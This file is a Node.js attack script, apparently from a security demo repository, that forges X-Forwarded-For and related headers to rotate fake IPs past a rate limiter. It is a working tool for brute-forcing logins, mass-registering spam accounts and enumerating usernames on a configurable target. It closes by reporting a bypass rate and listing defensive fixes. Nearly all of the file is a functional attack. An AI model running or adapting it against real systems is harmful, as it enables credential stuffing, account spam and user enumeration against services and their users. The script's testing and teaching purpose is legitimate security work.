/**
 * PROXY ROTATION ATTACK - IP Spoofing Demo
 * FOR EDUCATIONAL PURPOSES ONLY
 * 
 * This demonstrates how IP-based rate limiting can be bypassed by
 * rotating IP addresses (simulated via X-Forwarded-For header spoofing).
 * 
 * Setup:
 * 1. Terminal 1: cd server && npm run dev
 * 2. Terminal 2: cd dos-attacks && npm install
 * 3. Terminal 2: node proxy-rotation-attack.js
 */

import { request } from 'undici';
import chalk from 'chalk';
import ora from 'ora';

// Configuration
const CONFIG = {
  TARGET_URL: process.env.TARGET_URL || 'http://localhost:3000',
  NUM_REQUESTS: parseInt(process.env.NUM_REQUESTS) || 100,
  REQUESTS_PER_IP: parseInt(process.env.REQUESTS_PER_IP) || 5,
  ATTACK_TYPE: process.env.ATTACK_TYPE || 'login', // login, register, enumerate
  DELAY_MS: parseInt(process.env.DELAY_MS) || 50,
};

// Statistics
const stats = {
  successful: 0,
  rateLimited: 0,
  errors: 0,
  ipRotations: 0,
  startTime: 0,
  endTime: 0,
};

// Generate random IP address
function generateRandomIP() {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// Generate attack payload based on type
function generatePayload(type) {
  switch (type) {
    case 'register':
      return {
        endpoint: '/api/auth/register',
        method: 'POST',
        body: {
          username: `spamuser_${Date.now()}_${Math.random().toString(36).substring(7)}`,
          password: 'SpamPassword123!',
          publicKey: 'FAKE_PUBLIC_KEY_' + 'A'.repeat(500),
        },
      };
    
    case 'enumerate':
      const usernames = ['admin', 'user', 'test', 'demo', 'john', 'alice', 'support', 'root'];
      return {
        endpoint: `/api/auth/check-username/${usernames[Math.floor(Math.random() * usernames.length)]}`,
        method: 'GET',
        body: null,
      };
    
    case 'login':
    default:
      return {
        endpoint: '/api/auth/login',
        method: 'POST',
        body: {
          username: `user${Math.floor(Math.random() * 10)}`,
          password: `Password${Math.floor(Math.random() * 100)}!`,
        },
      };
  }
}

// Make a single request with spoofed IP
async function makeRequest(spoofedIP, payload) {
  const url = `${CONFIG.TARGET_URL}${payload.endpoint}`;
  
  try {
    const options = {
      method: payload.method,
      headers: {
        'Content-Type': 'application/json',
        'X-Forwarded-For': spoofedIP,  // Spoof the IP address
        'X-Real-IP': spoofedIP,
        'X-Client-IP': spoofedIP,
      },
    };

    if (payload.body) {
      options.body = JSON.stringify(payload.body);
    }

    const response = await request(url, options);
    
    // Read response body
    await response.body.text();
    
    return { statusCode: response.statusCode };
  } catch (error) {
    return { statusCode: 0, error: error.message };
  }
}

// Run the attack
async function runAttack() {
  console.clear();
  console.log(chalk.red.bold('\n‚ö†Ô∏è  PROXY ROTATION ATTACK DEMONSTRATION ‚ö†Ô∏è\n'));
  console.log(chalk.yellow('FOR EDUCATIONAL PURPOSES ONLY\n'));
  console.log('='.repeat(70) + '\n');
  
  console.log(chalk.cyan('Configuration:'));
  console.log(`  Target: ${chalk.white(CONFIG.TARGET_URL)}`);
  console.log(`  Attack Type: ${chalk.white(CONFIG.ATTACK_TYPE)}`);
  console.log(`  Total Requests: ${chalk.white(CONFIG.NUM_REQUESTS)}`);
  console.log(`  Requests per IP: ${chalk.white(CONFIG.REQUESTS_PER_IP)}`);
  console.log(`  IP Rotation: ${chalk.white('Enabled (X-Forwarded-For spoofing)')}\n`);

  const spinner = ora('Launching attack...').start();
  stats.startTime = Date.now();

  let currentIP = generateRandomIP();
  let requestsWithCurrentIP = 0;

  for (let i = 0; i < CONFIG.NUM_REQUESTS; i++) {
    // Rotate IP after REQUESTS_PER_IP requests
    if (requestsWithCurrentIP >= CONFIG.REQUESTS_PER_IP) {
      currentIP = generateRandomIP();
      requestsWithCurrentIP = 0;
      stats.ipRotations++;
    }

    // Generate payload and make request
    const payload = generatePayload(CONFIG.ATTACK_TYPE);
    const result = await makeRequest(currentIP, payload);
    
    // Track statistics
    if (result.statusCode === 200 || result.statusCode === 201) {
      stats.successful++;
    } else if (result.statusCode === 429) {
      stats.rateLimited++;
    } else if (result.statusCode === 401 || result.statusCode === 400) {
      stats.successful++; // Request went through (just invalid credentials)
    } else {
      stats.errors++;
    }

    requestsWithCurrentIP++;

    // Update progress
    const progress = ((i + 1) / CONFIG.NUM_REQUESTS * 100).toFixed(0);
    const bypassRate = stats.successful + stats.rateLimited > 0 
      ? (stats.successful / (stats.successful + stats.rateLimited) * 100).toFixed(1)
      : 0;
    
    spinner.text = `Progress: ${progress}% | IP: ${currentIP} | Success: ${stats.successful} | Blocked: ${stats.rateLimited} | Bypass: ${bypassRate}%`;

    // Small delay between requests
    await new Promise(resolve => setTimeout(resolve, CONFIG.DELAY_MS));
  }

  stats.endTime = Date.now();
  spinner.succeed('Attack completed!\n');

  // Print results
  printResults();
}

// Print attack results
function printResults() {
  const duration = (stats.endTime - stats.startTime) / 1000;
  const totalRequests = stats.successful + stats.rateLimited + stats.errors;
  const bypassRate = stats.successful + stats.rateLimited > 0
    ? (stats.successful / (stats.successful + stats.rateLimited) * 100)
    : 0;
  const requestRate = totalRequests / duration;

  console.log('='.repeat(70));
  console.log(chalk.red.bold('üî• ATTACK RESULTS üî•\n'));
  
  console.log(chalk.green(`‚úì Successful requests (bypassed rate limit): ${stats.successful}`));
  console.log(chalk.red(`‚úó Rate limited requests (429): ${stats.rateLimited}`));
  console.log(chalk.yellow(`‚ö† Other errors: ${stats.errors}`));
  console.log(chalk.blue(`üîÑ IP rotations performed: ${stats.ipRotations}`));
  
  const bypassColor = bypassRate > 80 ? chalk.red : bypassRate > 50 ? chalk.yellow : chalk.green;
  console.log(bypassColor(`\nüìä Bypass rate: ${bypassRate.toFixed(1)}%`));
  
  console.log(chalk.cyan(`\n‚è±  Performance:`));
  console.log(`  ‚Ä¢ Duration: ${duration.toFixed(2)} seconds`);
  console.log(`  ‚Ä¢ Request rate: ${requestRate.toFixed(1)} req/sec`);
  
  console.log('\n' + '='.repeat(70) + '\n');

  // Security assessment
  if (bypassRate > 80) {
    console.log(chalk.red.bold('üö® CRITICAL VULNERABILITY CONFIRMED!\n'));
    console.log(chalk.red('The rate limiter is INEFFECTIVE against IP rotation attacks.'));
    console.log(chalk.red('By simply changing IP addresses, an attacker bypassed your protection.\n'));
    
    console.log(chalk.yellow('What this means:'));
    console.log('  ‚Ä¢ Attackers can test unlimited passwords (credential stuffing)');
    console.log('  ‚Ä¢ They can create unlimited spam accounts');
    console.log('  ‚Ä¢ They can enumerate your user database');
    console.log('  ‚Ä¢ Your rate limiting provides almost no protection\n');
    
    console.log(chalk.cyan('Recommended fixes:'));
    console.log('  1. Add account-level rate limiting (track username)');
    console.log('  2. Implement account lockout after 5 failed attempts');
    console.log('  3. Require CAPTCHA after 3 failed attempts');
    console.log('  4. Add progressive delays (exponential backoff)');
    console.log('  5. Use device fingerprinting');
    console.log('  6. Deploy a WAF (Cloudflare, AWS WAF)\n');
  } else if (bypassRate > 30) {
    console.log(chalk.yellow.bold('‚ö†Ô∏è  MODERATE VULNERABILITY\n'));
    console.log(chalk.yellow('Rate limiting provides some protection but can be partially bypassed.\n'));
  } else {
    console.log(chalk.green.bold('‚úì RATE LIMITING EFFECTIVE\n'));
    console.log(chalk.green('IP rotation attack was largely unsuccessful.\n'));
  }
}

// Main
console.log(chalk.cyan('\nStarting in 3 seconds...\n'));
setTimeout(() => {
  runAttack().catch(error => {
    console.error(chalk.red('\n‚ùå Attack failed:'), error.message);
    process.exit(1);
  });
}, 3000);
